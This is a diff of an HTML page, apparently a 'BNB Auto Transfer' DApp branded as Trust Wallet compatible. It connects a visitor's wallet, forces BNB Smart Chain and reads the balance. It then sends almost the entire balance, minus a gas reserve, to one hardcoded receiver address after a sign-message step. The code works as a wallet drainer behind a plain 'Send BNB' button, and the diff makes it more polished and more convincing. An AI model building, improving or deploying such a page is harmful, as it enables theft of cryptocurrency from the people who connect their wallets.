@@ -2,210 +2,185 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB Auto Transfer DApp (Fixed)</title>
+  <title>BNB Auto Transfer - Trust Wallet Compatible</title>
 </head>
 <body>
-  <button id="sendButton">Send BNB</button>
+  <div style="padding: 20px; text-align: center;">
+    <h2>BNB Auto Transfer</h2>
+    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Send BNB</button>
+    <div id="status" style="margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px;"></div>
+  </div>
 
   <script>
     const receiverAddress = '0x70d459946ccea3CAC19ca79c9E40ea291625fAf8';
-    const gasLimit = 21000;
-    const gasPriceGwei = 5; // Increased for better reliability
+    
+    function updateStatus(message, isError = false) {
+      const status = document.getElementById('status');
+      status.innerHTML = message;
+      status.style.color = isError ? 'red' : 'green';
+      console.log(message);
+    }
 
     document.getElementById('sendButton').addEventListener('click', async () => {
-      console.log('Send BNB button clicked.');
+      updateStatus('Starting transaction process...');
 
       if (!window.ethereum) {
-        alert('Please install MetaMask or Trust Wallet to use this DApp.');
-        console.error('MetaMask or compatible wallet not found.');
+        updateStatus('Please install MetaMask or Trust Wallet!', true);
         return;
       }
-      const ethereum = window.ethereum;
-      console.log('Wallet found.');
 
       try {
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-        const account = accounts[0];
-        console.log('Account connected:', account);
+        // Request account access
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const userAccount = accounts[0];
+        updateStatus(`Connected: ${userAccount.substring(0,6)}...${userAccount.substring(38)}`);
 
-        let chainId = await ethereum.request({ method: 'eth_chainId' });
-        console.log('Current Chain ID:', chainId);
-
+        // Check if on BSC
+        let chainId = await window.ethereum.request({ method: 'eth_chainId' });
         if (chainId !== '0x38') {
-          console.log('Not on BNB Smart Chain. Attempting to switch/add.');
+          updateStatus('Switching to BNB Smart Chain...');
           try {
-            await ethereum.request({
+            await window.ethereum.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: '0x38' }],
             });
-            console.log('Switched to BNB Smart Chain.');
           } catch (switchError) {
-            console.warn('Failed to switch chain:', switchError);
             if (switchError.code === 4902) {
-              console.log('Adding BNB Smart Chain.');
-              try {
-                await ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '0x38',
-                    chainName: 'BNB Smart Chain Mainnet',
-                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                    rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                    blockExplorerUrls: ['https://bscscan.com']
-                  }],
-                });
-                console.log('Added BNB Smart Chain to wallet.');
-              } catch (addError) {
-                console.error('Failed to add BNB Smart Chain:', addError);
-                alert('Error: Could not add BNB Smart Chain to your wallet.');
-                return;
-              }
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x38',
+                  chainName: 'BNB Smart Chain',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/']
+                }],
+              });
             } else {
-              console.error('Failed to switch to BNB Smart Chain:', switchError);
-              alert('Error: Could not switch to BNB Smart Chain.');
-              return;
+              throw switchError;
             }
           }
-          
-          chainId = await ethereum.request({ method: 'eth_chainId' });
-          console.log('Chain ID after switch:', chainId);
+          // Verify chain switch
+          chainId = await window.ethereum.request({ method: 'eth_chainId' });
           if (chainId !== '0x38') {
-            alert('Please manually switch to BNB Smart Chain and try again.');
+            updateStatus('Please manually switch to BNB Smart Chain', true);
             return;
           }
         }
 
-        console.log('Fetching account balance...');
-        const balanceHex = await ethereum.request({
+        // Get balance
+        updateStatus('Checking balance...');
+        const balanceHex = await window.ethereum.request({
           method: 'eth_getBalance',
-          params: [account, 'latest']
+          params: [userAccount, 'latest']
         });
+        
         const balanceWei = BigInt(balanceHex);
-        console.log('Balance (Wei):', balanceWei.toString());
-
-        // Convert balance to BNB for display
-        const balanceBNB = Number(balanceWei) / Math.pow(10, 18);
-        console.log('Balance (BNB):', balanceBNB);
-
-        // Check minimum balance requirement
-        if (balanceBNB < 0.002) {
-          alert(`Insufficient BNB balance. Current: ${balanceBNB.toFixed(6)} BNB. Minimum required: 0.002 BNB.`);
-          return;
-        }
-
-        // Get current gas price from network
-        let networkGasPriceHex;
-        try {
-          networkGasPriceHex = await ethereum.request({ method: 'eth_gasPrice' });
-          console.log('Network gas price (hex):', networkGasPriceHex);
-        } catch (error) {
-          console.warn('Could not fetch network gas price, using default:', error);
-          networkGasPriceHex = '0x' + (BigInt(gasPriceGwei) * BigInt("1000000000")).toString(16);
-        }
-
-        const networkGasPriceWei = BigInt(networkGasPriceHex);
-        const gasPriceWei = networkGasPriceWei > BigInt(gasPriceGwei) * BigInt("1000000000") 
-          ? networkGasPriceWei 
-          : BigInt(gasPriceGwei) * BigInt("1000000000");
-
-        console.log('Using Gas Price (Wei):', gasPriceWei.toString());
-
-        // Calculate gas cost with smaller buffer for low balances
-        const baseCost = BigInt(gasLimit) * gasPriceWei;
-        let gasCost;
+        const balanceEth = parseFloat(balanceWei.toString()) / Math.pow(10, 18);
         
-        if (balanceBNB < 0.01) {
-          // For very low balances, use minimal buffer (10%)
-          gasCost = baseCost + (baseCost * BigInt(10) / BigInt(100));
-        } else if (balanceBNB < 0.1) {
-          // For low balances, use small buffer (20%)
-          gasCost = baseCost + (baseCost * BigInt(20) / BigInt(100));
-        } else {
-          // For higher balances, use normal buffer (50%)
-          gasCost = baseCost + (baseCost * BigInt(50) / BigInt(100));
-        }
+        updateStatus(`Current Balance: ${balanceEth.toFixed(6)} BNB`);
 
-        console.log('Total Gas Cost with buffer (Wei):', gasCost.toString());
-
-        // Check if balance covers gas cost
-        if (balanceWei <= gasCost) {
-          const gasCostBNB = Number(gasCost) / Math.pow(10, 18);
-          alert(`Insufficient BNB for gas fees. Balance: ${balanceBNB.toFixed(6)} BNB, Required: ${gasCostBNB.toFixed(6)} BNB`);
+        // Check minimum balance
+        if (balanceEth < 0.001) {
+          updateStatus(`Insufficient balance. Need at least 0.001 BNB, current: ${balanceEth.toFixed(6)} BNB`, true);
           return;
         }
 
-        // Calculate amount to send
-        const amountWei = balanceWei - gasCost;
-        console.log('Amount to send (Wei):', amountWei.toString());
-
-        if (amountWei <= 0n) {
-          alert('No BNB available to send after gas fees.');
+        // Use simple fixed gas calculation to avoid negative amounts
+        const gasLimit = 21000;
+        const gasPrice = 5000000000; // 5 Gwei in Wei
+        const gasReserve = gasLimit * gasPrice * 2; // Double reserve for safety
+        
+        // Calculate amount (ensure positive)
+        const gasReserveBigInt = BigInt(gasReserve);
+        
+        if (balanceWei <= gasReserveBigInt) {
+          updateStatus('Balance too low for gas fees', true);
+          return;
+        }
+        
+        const sendAmount = balanceWei - gasReserveBigInt;
+        const sendAmountEth = parseFloat(sendAmount.toString()) / Math.pow(10, 18);
+        
+        if (sendAmountEth <= 0) {
+          updateStatus('No amount available to send after gas fees', true);
           return;
         }
 
-        // Convert to readable format
-        const amountBNB = Number(amountWei) / Math.pow(10, 18);
-        console.log('Amount to send (BNB):', amountBNB);
+        updateStatus(`Preparing to send: ${sendAmountEth.toFixed(6)} BNB`);
 
-        // Message signing
-        const message = `Confirm sending ${amountBNB.toFixed(6)} BNB to ${receiverAddress}`;
-        console.log('Signing message:', message);
+        // Sign message for confirmation
+        const confirmMessage = `Send ${sendAmountEth.toFixed(6)} BNB to ${receiverAddress}`;
         
         try {
-          await ethereum.request({
+          await window.ethereum.request({
             method: 'personal_sign',
-            params: [message, account],
+            params: [confirmMessage, userAccount],
           });
-          console.log('Message signed successfully.');
+          updateStatus('Message signed. Sending transaction...');
         } catch (signError) {
-          console.error('Message signing failed:', signError);
-          alert('Transaction cancelled by user.');
+          updateStatus('Transaction cancelled by user', true);
           return;
         }
 
-        // Prepare transaction with proper hex formatting
-        const transactionParameters = {
-          from: account,
+        // Create transaction object - simplified approach
+        const txParams = {
+          from: userAccount,
           to: receiverAddress,
-          value: '0x' + amountWei.toString(16),
-          gas: '0x' + BigInt(gasLimit).toString(16),
-          gasPrice: '0x' + gasPriceWei.toString(16)
+          value: '0x' + sendAmount.toString(16),
+          gas: '0x' + gasLimit.toString(16),
+          gasPrice: '0x' + gasPrice.toString(16)
         };
-        
-        console.log('Transaction parameters:', JSON.stringify(transactionParameters, null, 2));
+
+        console.log('Transaction params:', txParams);
+        updateStatus('Submitting transaction...');
 
         // Send transaction
-        const txHash = await ethereum.request({
+        const txHash = await window.ethereum.request({
           method: 'eth_sendTransaction',
-          params: [transactionParameters],
+          params: [txParams],
         });
+
+        updateStatus(`✅ Success! Transaction Hash: ${txHash}`);
         
-        console.log('Transaction sent! Hash:', txHash);
-        alert(`Transaction successful!\nAmount: ${amountBNB.toFixed(6)} BNB\nTxHash: ${txHash}`);
+        // Show success alert
+        alert(`Transaction Successful!\nAmount: ${sendAmountEth.toFixed(6)} BNB\nTo: ${receiverAddress}\nHash: ${txHash}`);
 
       } catch (error) {
-        console.error('Transaction error:', error);
+        console.error('Error:', error);
         
-        let errorMessage = 'Transaction failed.';
+        let errorMsg = 'Transaction failed';
         
         if (error.code === 4001) {
-          errorMessage = 'Transaction rejected by user.';
+          errorMsg = 'Transaction rejected by user';
         } else if (error.code === -32000) {
-          errorMessage = 'Insufficient funds or network error.';
-        } else if (error.message) {
-          if (error.message.includes('insufficient funds')) {
-            errorMessage = 'Insufficient funds for transaction.';
-          } else if (error.message.includes('gas')) {
-            errorMessage = 'Gas estimation failed. Try again.';
-          } else if (error.message.includes('nonce')) {
-            errorMessage = 'Transaction nonce error. Please try again.';
+          if (error.message && error.message.includes('insufficient funds')) {
+            errorMsg = 'Insufficient funds for transaction';
           } else {
-            errorMessage = `Error: ${error.message}`;
+            errorMsg = 'Network error or insufficient gas';
+          }
+        } else if (error.message) {
+          if (error.message.includes('User denied') || error.message.includes('cancelled')) {
+            errorMsg = 'Transaction cancelled by user';
+          } else if (error.message.includes('insufficient')) {
+            errorMsg = 'Insufficient balance or gas';
+          } else {
+            errorMsg = `Error: ${error.message.substring(0, 100)}`;
           }
         }
         
-        alert(errorMessage);
+        updateStatus(errorMsg, true);
+        alert(errorMsg);
       }
+    });
+
+    // Add some basic styling
+    document.getElementById('sendButton').addEventListener('mouseover', function() {
+      this.style.background = '#0056b3';
+    });
+    
+    document.getElementById('sendButton').addEventListener('mouseout', function() {
+      this.style.background = '#007bff';
     });
   </script>
 </body>
